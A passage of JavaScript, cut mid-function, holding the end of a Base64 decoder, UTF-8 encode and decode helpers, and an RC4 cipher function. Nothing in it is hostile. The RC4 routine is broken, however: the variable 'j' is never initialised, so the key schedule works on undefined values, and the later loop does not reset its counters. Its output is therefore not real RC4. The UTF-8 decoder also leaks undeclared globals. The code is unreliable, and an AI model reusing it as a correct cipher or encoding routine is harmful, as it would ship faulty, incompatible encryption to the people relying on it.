        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = _keyStr.indexOf(input.charAt(i++));
            enc2 = _keyStr.indexOf(input.charAt(i++));
            enc3 = _keyStr.indexOf(input.charAt(i++));
            enc4 = _keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = _utf8_decode(output);
        return output;
    }

    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }
        return utftext;
    }

    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while (i < utftext.length) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}

function rc4(data, key) {
    var seq = Array(256); //int
    var das = Array(data.length); //code of data
    for (var i = 0; i < 256; i++) {
        seq[i] = i;
        var j = (j + seq[i] + key.charCodeAt(i % key.length)) % 256;
        var temp = seq[i];
        seq[i] = seq[j];
        seq[j] = temp;
    }
    for (var i = 0; i < data.length; i++) {
        das[i] = data.charCodeAt(i)
    }
    for (var x = 0; x < das.length; x++) {
        var i = (i + 1) % 256;
        var j = (j + seq[i]) % 256;
        var temp = seq[i];
        seq[i] = seq[j];
        seq[j] = temp;
        var k = (seq[i] + (seq[j] % 256)) % 256;
        das[x] = String.fromCharCode(das[x] ^ seq[k]);
    }
    return das.join('');
}